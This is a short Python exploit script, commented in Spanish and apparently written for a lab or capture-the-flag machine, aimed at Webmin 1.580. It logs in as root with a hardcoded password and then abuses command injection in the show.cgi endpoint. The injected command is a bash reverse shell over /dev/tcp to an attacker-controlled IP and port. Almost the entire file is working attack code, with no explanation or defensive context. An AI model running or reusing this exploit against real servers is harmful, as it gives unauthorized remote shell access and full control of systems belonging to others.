#!/usr/bin/env python3

#Compatible con la version "Webmin 1.580"
#Uso: python3 webminploit.py <IP objetivo>
import sys, requests, string, secrets
import urllib3

targetIP = sys.argv[1] 
lhost = "10.10.16.2" #IP atacante  
lport = "443" #Puerto a la escucha

urllib3.disable_warnings()

data = {'page' : "%2F", 'user' : "root", 'pass' : "jEhdIekWmdjE"}
url = f"https://{targetIP}:10000/session_login.cgi"

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
        print("[+] Login successful, executing payload")
else:
        print("[-] Failed to login")

sid = r.cookies["sid"]

def rand():
        alphaNum = string.ascii_letters + string.digits
        randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
        return randChar

def payload():
        payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
        return payload

exp = f"https://{targetIP}:10000/file/show.cgi/bin/{rand()}|{payload()}|"

req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)
